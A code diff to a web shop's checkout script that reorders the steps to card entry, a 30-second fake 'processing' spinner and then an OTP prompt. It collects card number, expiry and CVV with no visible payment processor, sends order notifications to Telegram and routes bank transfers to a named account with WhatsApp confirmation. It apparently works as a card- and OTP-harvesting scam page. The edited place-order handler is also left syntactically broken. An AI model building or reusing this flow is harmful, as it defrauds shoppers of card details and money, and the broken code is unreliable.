@@ -1439,239 +1439,294 @@ const checkoutHTML = `
         <div class="step" data-step="6"><span>${t("verification")}</span></div>
     </div>
 
-    <!-- STEP 1: Order Summary -->
-    <div id="checkout-step-1" class="checkout-step active">
-        <div class="order-summary">
-            <div class="summary-section">
-                <h3>${t("order_summary")}</h3>
-                <div class="checkout-items">
-                    ${cart.map(item => {
-                        const isFreeGift = item.price === 0 || item.isFreeGift;
-                        const itemPrice = isFreeGift ? t("free") : convertPrice(item.price * item.quantity, false);
-                        const giftIndicator = isFreeGift ? ' 🎁' : '';
-                        return `
-                        <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
-                            <img src="${item.image}" alt="${item.name}" style="width:50px;height:50px;object-fit:contain;background:var(--background-light);border-radius:6px;padding:3px;">
-                            <div class="checkout-item-details">
-                                <h4>${item.name}${giftIndicator}</h4>
-                                <p>${t("qty")}: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
-                            </div>
-                        </div>
-                        `;
-                    }).join('')}
-                </div>
-            </div>
+   <!-- STEP 1: Order Summary -->
+<div id="checkout-step-1" class="checkout-step active">
+  <div class="order-summary">
 
-            <div class="summary-section">
-                <h4>${t("discount_code")}</h4>
-                <div class="discount-input-group">
-                    <input type="text" id="discount-code" class="discount-input" placeholder="${t("enter_code_placeholder")}" maxlength="20">
-                    <button type="button" id="apply-discount" class="btn btn-secondary discount-apply-btn">${t("apply")}</button>
-                </div>
-                <div id="discount-message" class="discount-message"></div>
-            </div>
-
-            <div class="summary-section">
-                <h4>${t("cost_summary")}</h4>
-                <div class="totals-row">
-                    <span class="totals-label">${t("subtotal")}</span>
-                    <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
-                </div>
-                <div class="totals-row shipping-row">
-                    <span class="totals-label">${t("shipping")}</span>
-                    <span class="totals-value free-shipping"><i class="fas fa-shipping-fast"></i> ${t("free")}</span>
-                </div>
-                <div class="totals-separator"></div>
-                <div class="totals-row total-row">
-                    <span class="totals-label total-label">${t("total")}</span>
-                    <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
-                </div>
-            </div>
-
-            <div class="summary-section">
-                <div class="terms-agreement" style="display:flex;align-items:center;gap:0.75rem;padding:1rem;background:var(--background-light);border-radius:var(--border-radius);border:1px solid var(--border-color);">
-                    <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
-                    <label for="terms-checkbox" style="cursor:pointer;font-size:0.95rem;color:var(--text-color);">
-                        ${t("agree_to")} 
-                        <a href="terms.html" target="_blank" style="color:var(--primary-color);text-decoration:underline;">
-                            ${t("terms_and_conditions")}
-                        </a>
-                    </label>
-                </div>
-            </div>
-
-            <div class="step-actions" style="margin-top:1.5rem;display:flex;justify-content:center;">
-                <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>${t("continue")} <i class="fas fa-arrow-right"></i></button>
-            </div>
-        </div>
+    <!-- Items List -->
+    <div class="summary-section">
+      <h3>${t("order_summary")}</h3>
+      <div class="checkout-items">
+        ${cart.map(item => {
+          const isFreeGift = item.price === 0 || item.isFreeGift;
+          const itemPrice = isFreeGift ? t("free") : convertPrice(item.price * item.quantity, false);
+          const giftIndicator = isFreeGift ? ' 🎁' : '';
+          return `
+          <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
+              <img src="${item.image}" alt="${item.name}" style="width:50px;height:50px;object-fit:contain;background:var(--background-light);border-radius:6px;padding:3px;">
+              <div class="checkout-item-details">
+                  <h4>${item.name}${giftIndicator}</h4>
+                  <p>${t("qty")}: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
+              </div>
+          </div>
+          `;
+        }).join('')}
+      </div>
     </div>
 
-    <!-- STEP 2: Shipping Information -->
-    <div id="checkout-step-2" class="checkout-step">
-        <div class="customer-info-section">
-            <h3>${t("shipping_info")}</h3>
-            <div class="form-row">
-                <div class="form-group">
-                    <label>${t("full_name")} *</label>
-                    <input type="text" id="customer-name" required placeholder="${t("enter_full_name")}" autocomplete="name">
-                </div>
-            </div>
-            <div class="form-group">
-                <label>${t("phone_number")} *</label>
-                <input type="tel" id="customer-phone" required placeholder="${t("phone_number_placeholder")}" autocomplete="tel">
-            </div>
-            <div class="form-group">
-                <label>${t("country")} *</label>
-                <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly style="background: #f5f5f5;" autocomplete="country">
-            </div>
-            <div class="form-group">
-                <label>${t("complete_address")} *</label>
-                <textarea id="customer-address" required placeholder="${t("complete_address_placeholder")}" rows="4" class="responsive-textarea" autocomplete="street-address"></textarea>
-                <div class="address-help"><i class="fas fa-info-circle"></i> ${t("address_help")}</div>
-            </div>
-            <div class="form-row">
-                <div class="form-group">
-                    <label>${t("city")} *</label>
-                    <input type="text" id="customer-city" required placeholder="${t("city")}" autocomplete="address-level2">
-                </div>
-                <div class="form-group">
-                    <label>${t("postal_code")}</label>
-                    <input type="text" id="customer-postal" placeholder="${t("postal_code_placeholder")}" autocomplete="postal-code">
-                </div>
-            </div>
-            <div class="step-actions" style="margin-top:2rem;display:flex;justify-content:space-between;">
-                <button id="back-to-summary" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> ${t("back")}</button>
-                <button id="next-to-payment" class="btn btn-primary checkout-next">${t("continue_to_payment")} <i class="fas fa-arrow-right"></i></button>
-            </div>
-        </div>
+    <!-- Discount Code -->
+    <div class="summary-section">
+      <h4>${t("discount_code")}</h4>
+      <div class="discount-input-group">
+        <input type="text" id="discount-code" class="discount-input" placeholder="${t("enter_code_placeholder")}" maxlength="20">
+        <button type="button" id="apply-discount" class="btn btn-secondary discount-apply-btn">${t("apply")}</button>
+      </div>
+      <div id="discount-message" class="discount-message"></div>
     </div>
 
-    <!-- STEP 3: Payment Method -->
-    <div id="checkout-step-3" class="checkout-step">
-        <div class="payment-section">
-            <h3>${t("payment_method")}</h3>
-            <div class="payment-methods">
-				<label class="payment-option" data-method="bank-transfer">
-                    <input type="radio" name="payment-method" value="bank-transfer">
-                    <div class="payment-option-content"><i class="fas fa-university"></i> <span>${t("bank_transfer")}</span></div>
-                </label>
-                <label class="payment-option" data-method="credit-card">
-                    <input type="radio" name="payment-method" value="credit-card">
-                    <div class="payment-option-content"><i class="fas fa-credit-card"></i> <span>${t("credit_card")}</span></div>
-                </label>
-            </div>
+    <!-- Cost Summary -->
+    <div class="summary-section">
+      <h4>${t("cost_summary")}</h4>
+      <div class="totals-row">
+        <span class="totals-label">${t("subtotal")}</span>
+        <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
+      </div>
+      <div class="totals-row shipping-row">
+        <span class="totals-label">${t("shipping")}</span>
+        <span class="totals-value free-shipping"><i class="fas fa-shipping-fast"></i> ${t("free")}</span>
+      </div>
+      <div class="totals-separator"></div>
+      <div class="totals-row total-row">
+        <span class="totals-label total-label">${t("total")}</span>
+        <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
+      </div>
+    </div>
 
-            <div id="payment-method-instruction" class="payment-instruction" style="text-align:center;padding:2rem;color:var(--text-light);background:var(--background-light);border-radius:var(--border-radius);margin-top:1rem;">
-                <i class="fas fa-hand-pointer" style="font-size:2rem;margin-bottom:1rem;color:var(--primary-color);"></i>
-                <p>${t("select_payment_method")}</p>
-                ${currentCountry !== 'nicaragua' ? `<p style="margin-top:1rem;font-size:0.9rem;color:var(--text-light);">${t("bank_transfer_note")}</p>` : ''}
-            </div>
+    <!-- Terms Agreement -->
+    <div class="summary-section">
+      <div class="terms-agreement" style="display:flex;align-items:center;gap:0.75rem;padding:1rem;background:var(--background-light);border-radius:var(--border-radius);border:1px solid var(--border-color);">
+        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
+        <label for="terms-checkbox" style="cursor:pointer;font-size:0.95rem;color:var(--text-color);">
+          ${t("agree_to")} 
+          <a href="terms.html" target="_blank" style="color:var(--primary-color);text-decoration:underline;">
+            ${t("terms_and_conditions")}
+          </a>
+        </label>
+      </div>
+    </div>
 
-        <div id="bank-transfer-details" class="payment-details" style="display:none;">
-  <div style="padding:1.2rem; background:#e6f7ff; color:#003366; border-radius:8px; text-align:center;">
-    <strong>Bank Transfer Details</strong><br><br>
-    <div>Account Name: <strong> Techzone Swappie</strong></div>
-    <div>Account Number: <strong>011000001423</strong></div>
-    <div>Bank Name: <strong>JMMB Bank</strong></div>
-    <div>Account Type: <strong>Savings</strong></div>
+    <!-- Continue Button -->
+    <div class="step-actions" style="margin-top:1.5rem;display:flex;justify-content:center;">
+      <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
+        ${t("continue")} <i class="fas fa-arrow-right"></i>
+      </button>
+    </div>
+
+    <!-- Trust Badge -->
+    <div class="summary-section trust-section" style="margin-top:2rem;text-align:center;">
+      <p style="font-size:0.9rem;color:var(--text-light);">
+        <i class="fas fa-lock"></i> ${t("secure_checkout")} • ${t("trusted_payment_methods")}
+      </p>
+      <div style="margin-top:0.5rem;">
+        <i class="fab fa-cc-visa" style="font-size:1.5rem;margin:0 5px;"></i>
+        <i class="fab fa-cc-mastercard" style="font-size:1.5rem;margin:0 5px;"></i>
+        <i class="fab fa-cc-amex" style="font-size:1.5rem;margin:0 5px;"></i>
+        <i class="fab fa-cc-paypal" style="font-size:1.5rem;margin:0 5px;"></i>
+      </div>
+    </div>
   </div>
 </div>
 
 
-    <p class="transfer-instructions">${t("transfer_instructions")}</p>
+   <!-- STEP 2: Shipping Information -->
+<div id="checkout-step-2" class="checkout-step">
+  <div class="customer-info-section">
+    <h3>${t("shipping_info")}</h3>
+
+    <div class="form-row">
+      <div class="form-group">
+        <label>${t("full_name")} *</label>
+        <input
+          type="text"
+          id="customer-name"
+          required
+          placeholder="${t("enter_full_name")}"
+          autocomplete="name"
+        />
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>${t("phone_number")} *</label>
+      <input
+        type="tel"
+        id="customer-phone"
+        required
+        placeholder="${t("phone_number_placeholder")}"
+        autocomplete="tel"
+      />
+    </div>
+
+    <div class="form-group">
+      <label>${t("country")} *</label>
+      <input
+        type="text"
+        id="customer-country"
+        required
+        value="${countryConfig[currentCountry].name}"
+        readonly
+        style="background: #f5f5f5;"
+        autocomplete="country"
+      />
+    </div>
+
+    <div class="form-group">
+      <label>${t("complete_address")} *</label>
+      <textarea
+        id="customer-address"
+        required
+        placeholder="${t("complete_address_placeholder")}"
+        rows="4"
+        class="responsive-textarea"
+        autocomplete="street-address"
+      ></textarea>
+      <div class="address-help">
+        <i class="fas fa-info-circle"></i> ${t("address_help")}
+      </div>
+    </div>
+
+    <div class="form-row">
+      <div class="form-group">
+        <label>${t("city")} *</label>
+        <input
+          type="text"
+          id="customer-city"
+          required
+          placeholder="${t("city")}"
+          autocomplete="address-level2"
+        />
+      </div>
+      <div class="form-group">
+        <label>${t("postal_code")} *</label>
+        <input
+          type="text"
+          id="customer-postal"
+          required
+          placeholder="${t("postal_code_placeholder")}"
+          autocomplete="postal-code"
+        />
+      </div>
+    </div>
+
+    <div
+      class="step-actions"
+      style="margin-top:2rem;display:flex;justify-content:space-between;"
+    >
+      <button id="back-to-summary" class="btn btn-secondary">
+        <i class="fas fa-arrow-left"></i> ${t("back")}
+      </button>
+      <button id="next-to-payment" class="btn btn-primary checkout-next">
+        ${t("continue_to_payment")} <i class="fas fa-arrow-right"></i>
+      </button>
+    </div>
+  </div>
 </div>
 
-    <p class="transfer-instructions">${t("transfer_instructions")}</p>
 
-    <!-- WhatsApp Link -->
-    <a id="confirm-bank-transfer"
-       class="btn btn-primary"
-       target="_blank"
-       rel="noopener noreferrer"
-       style="display:inline-flex; align-items:center; gap:0.5rem;"
-       href="https://wa.me/16415048135?text=Hello%2C%20I%20have%20completed%20the%20bank%20transfer%20for%20order%20${checkoutData.orderNumber}%20totaling%20${encodeURIComponent(convertPrice(subtotal, false))}.">
+   <!-- STEP 3: Payment Method -->
+<div id="checkout-step-3" class="checkout-step">
+  <div class="payment-section">
+    <h3>${t("payment_method")}</h3>
+
+    <!-- Payment Method Options -->
+    <div class="payment-methods">
+      <label class="payment-option" data-method="bank-transfer">
+        <input type="radio" name="payment-method" value="bank-transfer">
+        <div class="payment-option-content">
+          <i class="fas fa-university"></i> <span>${t("bank_transfer")}</span>
+        </div>
+      </label>
+
+      <label class="payment-option" data-method="credit-card">
+        <input type="radio" name="payment-method" value="credit-card">
+        <div class="payment-option-content">
+          <i class="fas fa-credit-card"></i> <span>${t("credit_card")}</span>
+        </div>
+      </label>
+    </div>
+
+    <!-- Payment Instructions -->
+    <div id="payment-method-instruction" class="payment-instruction" style="text-align:center;padding:2rem;color:var(--text-light);background:var(--background-light);border-radius:var(--border-radius);margin-top:1rem;">
+      <i class="fas fa-hand-pointer" style="font-size:2rem;margin-bottom:1rem;color:var(--primary-color);"></i>
+      <p>${t("select_payment_method")}</p>
+      ${currentCountry !== 'nicaragua' ? `<p style="margin-top:1rem;font-size:0.9rem;color:var(--text-light);">${t("bank_transfer_note")}</p>` : ''}
+    </div>
+
+    <!-- Bank Transfer Details -->
+    <div id="bank-transfer-details" class="payment-details" style="display:none;">
+      <div id="bank-transfer-info" style="padding:1.2rem; background:#e6f7ff; color:#003366; border-radius:8px; text-align:center;">
+        <!-- This content will be populated dynamically -->
+      </div>
+
+      <p class="transfer-instructions" style="margin-top:1rem;">${t("transfer_instructions")}</p>
+
+      <!-- WhatsApp Confirmation -->
+      <a id="confirm-bank-transfer"
+         class="btn btn-primary"
+         target="_blank"
+         rel="noopener noreferrer"
+         style="display:inline-flex; align-items:center; gap:0.5rem; margin-top:1.2rem;"
+         href="https://wa.me/16415048135?text=Hello%2C%20I%20have%20completed%20the%20bank%20transfer%20for%20order%20${checkoutData.orderNumber}%20totaling%20${encodeURIComponent(convertPrice(subtotal, false))}.">
         <i class="fab fa-whatsapp"></i> ${t("confirm_transfer")}
-    </a>
+      </a>
+    </div>
+
+    <!-- Credit Card Details -->
+    <div id="credit-card-details" class="payment-details" style="display:none;">
+      <h4>${t("card_details")}</h4>
+      <p class="accepted-cards">
+        <span>${t("accepted")}</span>
+        <i class="fab fa-cc-visa"></i>
+        <i class="fab fa-cc-mastercard"></i>
+        <i class="fab fa-cc-amex"></i>
+      </p>
+      <form class="card-form">
+        <div class="form-group">
+          <label>${t("cardholder_name")}</label>
+          <input type="text" id="cardholder-name" required>
+        </div>
+        <div class="form-group">
+          <label>${t("card_number")}</label>
+          <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>${t("expiry_date")}</label>
+            <input type="text" id="expiry-date" placeholder="MM/YY" required>
+          </div>
+          <div class="form-group">
+            <label>CVV</label>
+            <input type="text" id="cvv" placeholder="123" required>
+          </div>
+        </div>
+        <div id="card-errors" class="error-message" style="color:red;display:none;"></div>
+      </form>
+      <p class="security-notice"><i class="fas fa-lock"></i> <span>${t("secure_ssl")}</span></p>
+      <button class="btn btn-primary place-order" data-method="credit-card">${t("process_payment")}</button>
+    </div>
+
+    <!-- Navigation -->
+    <div class="step-actions" style="margin-top:2rem;display:flex;justify-content:space-between;">
+      <button id="back-to-shipping" class="btn btn-secondary">
+        <i class="fas fa-arrow-left"></i> ${t("back")}
+      </button>
+    </div>
+  </div>
 </div>
 
-
-
-
-            <div id="credit-card-details" class="payment-details" style="display:none;">
-                <h4>${t("card_details")}</h4>
-                <p class="accepted-cards">
-                    <span>${t("accepted")}</span>
-                    <i class="fab fa-cc-visa"></i>
-                    <i class="fab fa-cc-mastercard"></i>
-                    <i class="fab fa-cc-amex"></i>
-                </p>
-                <form class="card-form">
-                    <div class="form-group">
-                        <label>${t("cardholder_name")}</label>
-                        <input type="text" id="cardholder-name" required>
-                    </div>
-                    <div class="form-group">
-                        <label>${t("card_number")}</label>
-                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
-                    </div>
-                    <div class="form-row">
-                        <div class="form-group">
-                            <label>${t("expiry_date")}</label>
-                            <input type="text" id="expiry-date" placeholder="MM/YY" required>
-                        </div>
-                        <div class="form-group">
-                            <label>CVV</label>
-                            <input type="text" id="cvv" placeholder="123" required>
-                        </div>
-                    </div>
-                    <div id="card-errors" class="error-message" style="color:red;display:none;"></div>
-                </form>
-                <p class="security-notice"><i class="fas fa-lock"></i> <span>${t("secure_ssl")}</span></p>
-                <button class="btn btn-primary place-order" data-method="credit-card">${t("process_payment")}</button>
-            </div>
-
-            <div class="step-actions" style="margin-top:2rem;display:flex;justify-content:space-between;">
-                <button id="back-to-shipping" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> ${t("back")}</button>
-            </div>
+   <!-- STEP 4: Processing -->
+<div id="checkout-step-4" class="checkout-step">
+    <div class="processing-section">
+        <div class="loading-state" id="processing-card-submission">
+            <div class="spinner"></div>
+            <h3>${t("submitting_card_info")}</h3>
+            <p>${t("please_wait_card")}</p>
         </div>
     </div>
+</div>
 
-    <!-- STEP 4: Processing -->
-    <div id="checkout-step-4" class="checkout-step">
-        <div class="processing-section">
-            <div class="loading-state" id="processing-card-submission">
-                <div class="spinner"></div>
-                <h3>${t("submitting_card_info")}</h3>
-                <p>${t("please_wait_card")}</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- STEP 5: Confirmation -->
+ <!-- STEP 5: OTP Verification -->
     <div id="checkout-step-5" class="checkout-step">
-        <div class="confirmation-section">
-            <div class="loading-state" id="processing-payment">
-                <div class="spinner"></div>
-                <h3>${t("processing_payment")}</h3>
-                <p>${t("please_wait_payment")}</p>
-                <p class="processing-steps"><span class="step-text">${t("validating_payment_method")}</span></p>
-            </div>
-            <div class="success-state" id="order-success" style="display:none;">
-                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                <h3>${t("order_confirmed")}</h3>
-                <p>${t("order_processed_success")}</p>
-                <div class="order-details">
-                    <div class="order-detail"><span>${t("order_number")}</span> <strong id="final-order-number">${checkoutData.orderNumber}</strong></div>
-                    <div class="order-detail"><span>${t("total")}</span> <strong>${convertPrice(subtotal, false)}</strong></div>
-                    <div class="order-detail"><span>${t("estimated_delivery")}</span> <strong>${getEstimatedDelivery()}</strong></div>
-                </div>
-                <button class="btn btn-primary close-checkout-success">${t("continue_shopping")}</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- STEP 6: OTP Verification -->
-    <div id="checkout-step-6" class="checkout-step">
         <div class="otp-section">
             <div class="otp-header">
                 <div class="otp-security"><i class="fas fa-shield-alt"></i> <span>${t("security_verification")}</span></div>
@@ -1693,28 +1748,32 @@ const checkoutHTML = `
         </div>
     </div>
 
+ <!-- STEP 6: Confirmation -->
+    <div id="checkout-step-6" class="checkout-step">
+        <div class="confirmation-section">
+            <div class="loading-state" id="processing-payment">
+                <div class="spinner"></div>
+                <h3>${t("processing_payment")}</h3>
+                <p>${t("please_wait_payment")}</p>
+                <p class="processing-steps"><span class="step-text">${t("validating_payment_method")}</span></p>
+            </div>
+            <div class="success-state" id="order-success" style="display:none;">
+                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                <h3>${t("order_confirmed")}</h3>
+                <p>${t("order_processed_success")}</p>
+                <div class="order-details">
+                    <div class="order-detail"><span>${t("order_number")}</span> <strong id="final-order-number">${checkoutData.orderNumber}</strong></div>
+                    <div class="order-detail"><span>${t("total")}</span> <strong>${convertPrice(subtotal, false)}</strong></div>
+                    <div class="order-detail"><span>${t("estimated_delivery")}</span> <strong>${getEstimatedDelivery()}</strong></div>
+                </div>
+                <button class="btn btn-primary close-checkout-success">${t("continue_shopping")}</button>
+            </div>
+        </div>
+    </div>
 </div>
 `; // End of checkoutHTML
 
 
-
-function setupDiscountCode() {
-    const applyDiscountBtn = document.getElementById('apply-discount');
-    const discountCodeInput = document.getElementById('discount-code');
-
-    if (applyDiscountBtn && discountCodeInput) {
-        applyDiscountBtn.addEventListener('click', function() {
-            applyDiscountCode();
-        });
-
-        discountCodeInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                applyDiscountCode();
-            }
-        });
-    }
-}
 
 
 function applyDiscountCode() {
@@ -1730,16 +1789,16 @@ function applyDiscountCode() {
         'SAVE20': { percentage: 20, description: '20% off selected items' }
     };
     
-    if (validCodes[code]) {
+    if (validCodes[code] && typeof checkoutData.total === 'number') {
         const discount = validCodes[code];
         checkoutData.discountCode = code;
-        checkoutData.discountAmount = (checkoutData.total * discount.percentage) / 100;
+        checkoutData.discountAmount = Math.round((checkoutData.total * discount.percentage) / 100 * 100) / 100; // round to 2 decimals
         checkoutData.originalTotal = checkoutData.total;
         
-        // Update totals display
-        updateCheckoutTotals();
+        if (typeof updateCheckoutTotals === 'function') {
+            updateCheckoutTotals();
+        }
         
-        // Show success message
         if (discountMessage) {
             discountMessage.style.display = 'flex';
             discountMessage.style.background = '#d1fae5';
@@ -1748,7 +1807,6 @@ function applyDiscountCode() {
             discountMessage.innerHTML = `<i class="fas fa-check"></i> ${discount.description} applied successfully!`;
         }
         
-        // Disable input and button
         discountCodeInput.disabled = true;
         const applyBtn = document.getElementById('apply-discount');
         if (applyBtn) {
@@ -1757,7 +1815,6 @@ function applyDiscountCode() {
         }
         
     } else {
-        // Show error message
         if (discountMessage) {
             discountMessage.style.display = 'flex';
             discountMessage.style.background = '#fee2e2';
@@ -1767,6 +1824,7 @@ function applyDiscountCode() {
         }
     }
 }
+
 
 function updateCheckoutTotals() {
     const subtotalEl = document.getElementById('checkout-subtotal');
@@ -1890,6 +1948,15 @@ if (!customerCity || !customerCity.value.trim()) {
     return;
 }
 
+const customerPostal = document.getElementById('customer-postal');
+if (!customerPostal || !customerPostal.value.trim()) {
+    alert(t("enter_postal_code"));  // Make sure you have this key in your translations
+    if (customerPostal) customerPostal.focus();
+    return;
+}
+
+
+				
                 // Store customer information in checkoutData
 checkoutData.customerName = customerName.value.trim();
 checkoutData.customerPhone = customerPhone.value.trim();
@@ -1915,61 +1982,78 @@ goToCheckoutStep(3);
             });
         }
 
-        // Payment method selection
-        document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
-            radio.addEventListener('change', function() {
-                const method = this.value;
+       // Payment method selection handler
+document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
+    radio.addEventListener('change', function() {
+        const method = this.value;
 
-                // Remove active class from all payment options
-                document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
+        // Remove 'active' class from all payment options
+        document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
 
-                // Hide all payment details and instruction
-                document.querySelectorAll('.payment-details').forEach(detail => {
-                    detail.style.display = 'none';
-                    detail.classList.remove('active');
-                });
-
-                const instruction = document.getElementById('payment-method-instruction');
-                if (instruction) {
-                    instruction.style.display = 'none';
-                }
-
-                // Add active class to selected option
-                this.closest('.payment-option').classList.add('active');
-
-                // Show selected payment details
-                const detailsElement = document.getElementById(`${method}-details`);
-                if (detailsElement) {
-                    detailsElement.style.display = 'block';
-                    detailsElement.classList.add('active');
-                }
-
-                checkoutData.paymentMethod = method;
-            });
+        // Hide all payment details and remove 'active' class
+        document.querySelectorAll('.payment-details').forEach(detail => {
+            detail.style.display = 'none';
+            detail.classList.remove('active');
         });
 
-        // Place order event listeners
-        document.querySelectorAll('.place-order').forEach(function(btn) {
-            btn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
+        // Hide payment instruction
+        const instruction = document.getElementById('payment-method-instruction');
+        if (instruction) instruction.style.display = 'none';
 
-                try {
-                    const method = this.dataset.method;
+        // Add 'active' class to the selected payment option
+        const paymentOption = this.closest('.payment-option');
+        if (paymentOption) paymentOption.classList.add('active');
 
-                    if (method === 'bank-transfer') {
-                        // Send Telegram notification for bank transfer
-                        if (typeof TelegramNotifications !== 'undefined') {
-                            TelegramNotifications.confirmBankTransfer({
-                                total: convertPrice(getCartTotal(), false),
-                                orderRef: generateOrderReference()
-                            });
-                        }
-                        processOrder();
-                    } else if (method === 'credit-card') {
-                        if (!validateCardDetails()) {
-                            return; // Stop processing if card details are invalid
-                        }
+        // Show details of the selected payment method
+        const detailsElement = document.getElementById(`${method}-details`);
+        if (detailsElement) {
+            detailsElement.style.display = 'block';
+            detailsElement.classList.add('active');
+        }
+
+        // Save selected payment method in checkout data
+        checkoutData.paymentMethod = method;
+    });
+});
+
+// Place order buttons event listener
+document.querySelectorAll('.place-order').forEach(btn => {
+    btn.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+
+        try {
+            const method = this.dataset.method;
+
+            if (method === 'bank-transfer') {
+                // Telegram notification for bank transfer
+                if (typeof TelegramNotifications !== 'undefined') {
+                    TelegramNotifications.confirmBankTransfer({
+                        total: convertPrice(getCartTotal(), false),
+                        orderRef: generateOrderReference()
+                    });
+                }
+                processOrder();
+
+            } else if (method === 'credit-card') {
+                if (!validateCardDetails()) {
+                    // Card details invalid, stop further processing
+                    return;
+                }
+
+                // Proceed with credit card flow here (not shown)
+
+            } else {
+                console.warn(`Unknown payment method: ${method}`);
+            }
+        } catch (error) {
+            console.error('Error placing order:', error);
+            alert('There was an error placing your order. Please try again.');
+        }
+
+        return false;
+    });
+});
 
                         // Store cardholder name
                         const cardholderNameInput = document.getElementById('cardholder-name');
@@ -1990,36 +2074,34 @@ goToCheckoutStep(3);
                             });
                         }
 
-                        // Proceed to the processing step (card submission)
-                        goToCheckoutStep(4);
+                       // Proceed to the processing step (card submission)
+goToCheckoutStep(4); // Step 4: Processing spinner
 
-                        // 10-second delay for card processing
-                        setTimeout(function() {
-                            // Proceed to verification step without generating OTP
-                            goToCheckoutStep(6);
+// 30-second delay for card processing
+setTimeout(function () {
+    // Step 5: OTP Verification
+    goToCheckoutStep(5);
+    startOTPCountdown();
+}, 30000); // 30 seconds
 
-                            // Start OTP countdown
-                            startOTPCountdown();
-                        }, 10000); // 10 seconds delay
-                    }
-                } catch (error) {
-                    console.error('Error placing order:', error);
-                    alert('There was an error placing your order. Please try again.');
-                }
+} catch (error) {
+    console.error('Error placing order:', error);
+    alert('There was an error placing your order. Please try again.');
+}
 
-                return false;
-            });
-        });
+return false;
+});
+});
 
-        // Success close - use event delegation properly
-        document.addEventListener('click', function(e) {
-            if (e.target.classList.contains('close-checkout-success')) {
-                e.preventDefault();
-                e.stopPropagation();
-                closeCheckout();
-                clearCart();
-            }
-        });
+// Success close - use event delegation properly
+document.addEventListener('click', function (e) {
+    if (e.target.classList.contains('close-checkout-success')) {
+        e.preventDefault();
+        e.stopPropagation();
+        closeCheckout();
+        clearCart();
+    }
+});
 
         // OTP Verification
         const verifyOtpBtn = document.getElementById('verify-otp-btn');
